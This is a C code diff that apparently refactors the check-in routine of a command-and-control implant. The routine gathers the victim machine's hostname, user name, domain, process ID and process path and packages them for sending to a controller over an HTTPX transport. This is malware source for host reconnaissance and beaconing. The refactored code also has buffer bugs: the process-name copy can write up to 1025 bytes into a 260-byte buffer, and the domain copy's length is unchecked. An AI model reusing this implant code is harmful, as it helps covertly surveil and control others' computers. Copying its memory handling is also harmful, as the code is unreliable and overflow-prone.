@@ -73,58 +73,58 @@ BYTE CheckinGetArch()
 }
 
 // Getting the current hostname
-PCHAR CheckinGetHostname()
+BOOL CheckinGetHostname(_Out_ PCHAR hostname)
 {
-    LPSTR data = NULL;
     DWORD dataLen = 0;
-    const char *hostnameRep = "N/A";
     if (!GetComputerNameExA(ComputerNameNetBIOS, NULL, &dataLen))
     {
-        if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
+        if (GetComputerNameExA(ComputerNameNetBIOS, hostname, &dataLen))
         {
-            GetComputerNameExA(ComputerNameNetBIOS, data, &dataLen);
-            hostnameRep = data;
+            hostname[dataLen] = '\0';
+            return TRUE;
         }
     }
-    return (char *)hostnameRep;
+    return FALSE;
 }
 
 // Getting the username of the current user
-char *CheckinGetUserName()
+BOOL CheckinGetUserName(_Out_ PCHAR username)
 {
-    LPSTR data = NULL;
     DWORD dataLen = 0;
-    const char *userName = "N/A";
     if (!GetUserNameA(NULL, &dataLen))
     {
-        if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
+        if (GetUserNameA(username, &dataLen))
         {
-            GetUserNameA(data, &dataLen);
-            userName = data;
+            username[dataLen] = '\0';
+            return TRUE;
         }
     }
-    return (char *)userName;
+    return FALSE;
 }
 
 // Getting the domain from the machine
-LPWSTR CheckinGetDomain()
+BOOL CheckinGetDomain(_Out_ PWCHAR domain)
 {
     DWORD dwLevel = 102;
     LPWKSTA_INFO_102 pBuf = NULL;
-    PWCHAR domain = NULL;
     NET_API_STATUS nStatus;
     LPWSTR pszServerName = NULL;
     nStatus = NetWkstaGetInfo(pszServerName, dwLevel, (LPBYTE *)&pBuf);
     if (nStatus == NERR_Success)
     {
         DWORD length = lstrlenW(pBuf->wki102_langroup);
-        domain = (PWCHAR)LocalAlloc(LPTR, sizeof(WCHAR) * (length + 1));    // +1 null terminator
-        memcpy(domain, pBuf->wki102_langroup, sizeof(WCHAR) * length);
-        domain[length] = L'\0'; // Explicitly set the null terminator.
+        memcpy(domain, pBuf->wki102_langroup, sizeof(WCHAR) * length + 1);
+        domain[length] = L'\0';
+        
+        if (pBuf != NULL)
+            NetApiBufferFree(pBuf);
+
+        return TRUE;
     }
+
     if (pBuf != NULL)
         NetApiBufferFree(pBuf);
-    return domain;
+    return FALSE;
 }
 
 // Getting the current OS Name (not implemented)
@@ -134,22 +134,17 @@ char *CheckinGetOsName()
 }
 
 // Getting the current process name
-char *CheckinGetCurrentProcName()
+BOOL CheckinGetCurrentProcName(_Out_ PCHAR processName)
 {
-    char *processName = NULL;
-    HANDLE handle = GetCurrentProcess();
-    if (handle)
+    DWORD buffSize = 1024;
+    CHAR buffer[1024];
+    if (QueryFullProcessImageNameA(GetCurrentProcess(), 0, buffer, &buffSize))
     {
-        DWORD buffSize = 1024;
-        CHAR buffer[1024];
-        if (QueryFullProcessImageNameA(handle, 0, buffer, &buffSize))
-        {
-            processName = (char *)LocalAlloc(LPTR, buffSize + 1);
-            memcpy(processName, buffer, buffSize);
-        }
-        CloseHandle(handle);
+        memcpy(processName, buffer, buffSize + 1);
+        processName[buffSize] = '\0';
+        return TRUE;
     }
-    return processName;
+    return FALSE;
 }
 
 BOOL CheckinSend()
@@ -196,21 +191,50 @@ BOOL CheckinSend()
     // Arch
     PackageAddByte(CheckinData, CheckinGetArch());
     // Hostname
-    PackageAddString(CheckinData, CheckinGetHostname(), TRUE);
+    CHAR Hostname[MAX_PATH];
+    if (CheckinGetHostname(Hostname))
+    {
+        PackageAddString(CheckinData, Hostname, TRUE);
+    } else
+    {
+        PackageAddString(CheckinData, "", TRUE);
+    }
     // Username
-    PackageAddString(CheckinData, CheckinGetUserName(), TRUE);
+    CHAR Username[MAX_PATH];
+    if (CheckinGetUserName(Username))
+    {
+        PackageAddString(CheckinData, Username, TRUE);
+    } else
+    {
+        PackageAddString(CheckinData, "", TRUE);
+    }
     // Domain
-    PackageAddWString(CheckinData, CheckinGetDomain(), TRUE);
+    WCHAR Domain[MAX_PATH];
+    if (CheckinGetDomain(Domain))
+    {
+        PackageAddWString(CheckinData, Domain, TRUE);
+    } else
+    {
+        PackageAddWString(CheckinData, L"", TRUE);
+    }
     // PID
     PackageAddInt32(CheckinData, GetCurrentProcessId());
     // ProcessName
-    PackageAddString(CheckinData, CheckinGetCurrentProcName(), TRUE);
+    CHAR ProcessName[MAX_PATH];
+    if (CheckinGetCurrentProcName(ProcessName))
+    {
+        PackageAddString(CheckinData, ProcessName, TRUE);
+    } else
+    {
+        PackageAddString(CheckinData, "", TRUE);
+    }
     // External IP 
     PackageAddString(CheckinData, (PCHAR) "1.1.1.1", TRUE);    // TODO
 
+    /* Free some allocations */
+    LocalFree(tableOfIPs);
 
     /* Send checkin package and wait for success */
-
     PARSER Output = { 0 };
 
 #ifdef HTTPX_TRANSPORT
